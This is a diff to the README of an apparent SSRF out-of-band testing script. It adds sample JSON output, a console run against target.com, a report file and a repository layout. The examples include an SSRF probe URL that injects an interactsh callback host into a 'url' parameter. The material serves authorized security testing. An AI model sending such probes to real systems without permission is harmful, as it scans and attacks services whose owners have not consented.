@@ -167,6 +167,83 @@ Results / GitHub integration:
 <outdir>/interactsh.log    Raw interactsh-client JSON stream
 ```
 
+Example `confirmed.json` — each hit is traced to the exact request:
+
+```json
+[
+  {
+    "label": "0gyw3n95rqnl",
+    "protocol": "http",
+    "protocols_seen": "http",
+    "remote_address": "203.0.113.7",
+    "timestamp": "2026-11-12T07:15:00Z",
+    "test_url": "https://target.com/api/fetch?url=http://0gyw3n95rqnl.abcd1234abcd.oast.pro/",
+    "source_line": "https://target.com/api/fetch?url=FUZZ",
+    "injection": "fuzz-marker"
+  }
+]
+```
+
+Example `summary.json` (handy for piping into other tooling):
+
+```json
+{
+  "version": "4.0",
+  "domain": "abcd1234abcd.oast.pro",
+  "input": "https://target.com/api/fetch?url=FUZZ",
+  "total_test_cases": 2,
+  "sent": 2,
+  "send_failures": 0,
+  "unsent": 0,
+  "confirmed_hits": 2,
+  "noise_interactions": 0
+}
+```
+
+## Sample run
+
+```console
+$ ./ssrf_oob.sh -u "https://target.com/api/fetch?url=FUZZ"
+==========================================
+ SSRF OOB Callback Helper v4.0
+ URL:    https://target.com/api/fetch?url=FUZZ
+ Output: ssrf_oob_20261112_071500/
+==========================================
+
+[*] Starting interactsh-client session...
+[+] Session domain: abcd1234abcd.oast.pro
+[+] Generated 2 correlated test cases (full list in ssrf_oob_20261112_071500/correlation.tsv)
+
+[*] Sending 2 requests (concurrency: 5, timeout: 15s, retries: 0)...
+[+] All requests dispatched (2 sent, 0 failed).
+
+[*] Waiting 45s for out-of-band callbacks (raise -w for targets that process SSRF asynchronously)...
+[+] LIVE OOB HIT: 0gyw3n95rqnl.abcd1234abcd.oast.pro (label=0gyw3n95rqnl) -- correlating to the exact request...
+[+] LIVE OOB HIT: njvrucdr92nr.abcd1234abcd.oast.pro (label=njvrucdr92nr) -- correlating to the exact request...
+
+[*] Correlating interactions against known labels...
+
+==========================================
+[+] 2 CONFIRMED out-of-band interaction(s) -- each traced to exactly one request.
+ Full per-candidate report: ssrf_oob_20261112_071500/report.txt
+ Confirmed hits (JSON):     ssrf_oob_20261112_071500/confirmed.json
+ Run summary (JSON):        ssrf_oob_20261112_071500/summary.json
+ Correlation table:         ssrf_oob_20261112_071500/correlation.tsv
+==========================================
+```
+
+And the matching `report.txt`:
+
+```
+SSRF OOB Callback Report
+Domain: abcd1234abcd.oast.pro
+Total test cases: 2
+Confirmed OOB hits: 2
+==========================================
+[CONFIRMED] https://target.com/api/fetch?url=FUZZ  |  fuzz-marker  |  http  ->  see confirmed.json (label=0gyw3n95rqnl)
+[CONFIRMED] https://target.com/api/fetch?url=FUZZ  |  fuzz-marker  |  bare  ->  see confirmed.json (label=njvrucdr92nr)
+```
+
 ## Pushing results to a findings repo (with `gh`)
 
 ```bash
@@ -192,6 +269,36 @@ lands locally and the script tells you so instead of failing silently.
    against the correlation table.
 4. A match → confirmed, with the exact source request attached.
    No match → noise, reported but not counted.
+
+## Repository structure
+
+```
+Ssrf/
+├── ssrf_oob.sh                    # the tool itself (bash + curl + interactsh-client)
+├── wordlists/
+│   └── params.txt                 # 409 candidate SSRF param names for auto-expansion
+├── tests/
+│   ├── run_tests.sh               # hermetic test suite (42 tests, no network needed)
+│   └── stubs/                     # stub interactsh-client + curl used by the tests
+│       ├── interactsh-client
+│       └── curl
+├── examples/
+│   └── urls.txt                   # sample target list
+├── .github/
+│   ├── workflows/
+│   │   └── ci.yml                 # CI: shellcheck + test suite + bash -n
+│   ├── ISSUE_TEMPLATE/            # bug report & feature request forms
+│   │   ├── bug_report.yml
+│   │   └── feature_request.yml
+│   └── PULL_REQUEST_TEMPLATE.md
+├── install.sh                     # installs script + wordlist into ~/.local/bin
+├── Dockerfile                     # ready-to-run image with interactsh preinstalled
+├── README.md                      # this file
+├── CHANGELOG.md                   # version history
+├── SECURITY.md                    # authorized-use policy + how to report tool bugs
+├── CONTRIBUTING.md                # how to contribute
+└── LICENSE                        # MIT
+```
 
 ## Development
 
